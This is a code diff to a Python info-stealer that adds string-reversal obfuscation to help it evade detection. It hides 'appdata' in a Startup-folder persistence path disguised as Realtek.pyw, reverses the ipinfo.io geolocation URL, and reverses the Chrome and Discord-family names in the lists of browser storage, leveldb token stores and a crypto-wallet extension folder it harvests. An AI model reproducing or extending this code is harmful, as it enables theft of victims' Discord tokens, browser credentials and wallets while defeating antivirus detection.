@@ -290,8 +290,8 @@ def Clipboard():
         return clipboard_data
     except:
         pass
-
-path = f"{os.getenv('appdata')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
+apppp = 'atadppa'
+path = f"{os.getenv(f'{apppp[::-1]}')}\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Realtek.pyw"
 
 def startup():
     global StartupMessage
@@ -396,8 +396,9 @@ def systemInfo():
 
 
 def globalInfo():
-    url = 'https://ipinfo.io/json'
-    response = urllib.request.urlopen(url)
+    
+    url = 'nosj/oi.ofnipi//:sptth'
+    response = urllib.request.urlopen(url[::-1])
     data = json.loads(response.read().decode())
     ip = data['ip']
     loc = data['loc']
@@ -1090,21 +1091,26 @@ def GatherZips(paths1, paths2, paths3):
 
 
 def GatherAll():
+    c = 'emorhc'
     browserPaths = [        
         [f"{roaming}/Opera Software/Opera GX Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{roaming}/Opera Software/Opera Stable", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{roaming}/Opera Software/Opera Neon/User Data/Default", "opera.exe", "/Local Storage/leveldb", "/", "/Network", "/Local Extension Settings/nkbihfbeogaeaoehlefnknn" ],
-        [f"{local}/Google/Chrome/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
-        [f"{local}/Google/Chrome SxS/User Data", "chrome.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{local}/Google/{c[::-1]}/User Data", f"{c[::-1]}.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
+        [f"{local}/Google/{c[::-1]} SxS/User Data", f"{c[::-1]}.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/BraveSoftware/Brave-Browser/User Data", "brave.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Yandex/YandexBrowser/User Data", "yandex.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/HougaBouga/nkbihfbeogaeaoehlefnkodbefgpgknn" ],
         [f"{local}/Microsoft/Edge/User Data", "edge.exe", "/Default/Local Storage/leveldb", "/Default", "/Default/Network", "/Default/Local Extension Settings/nkbihfbeogaeaoehlefnkodbefgpgknn" ]
     ]
+    d = 'drocsiD'
+    ddd = 'btpdrocsid'
+    dd = 'drocthgiL'
+    dddd = 'yranacdrocsid'
     discordPaths = [        
-        [f"{roaming}/Discord", "/Local Storage/leveldb"],
-        [f"{roaming}/Lightcord", "/Local Storage/leveldb"],
-        [f"{roaming}/discordcanary", "/Local Storage/leveldb"],
-        [f"{roaming}/discordptb", "/Local Storage/leveldb"],
+        [f"{roaming}/{d[::-1]}", "/Local Storage/leveldb"],
+        [f"{roaming}/{dd[::-1]}", "/Local Storage/leveldb"],
+        [f"{roaming}/{dddd[::-1]}", "/Local Storage/leveldb"],
+        [f"{roaming}/{ddd[::-1]}", "/Local Storage/leveldb"],
     ]
     zefez = 'tellaW'
     PathsToZip = [
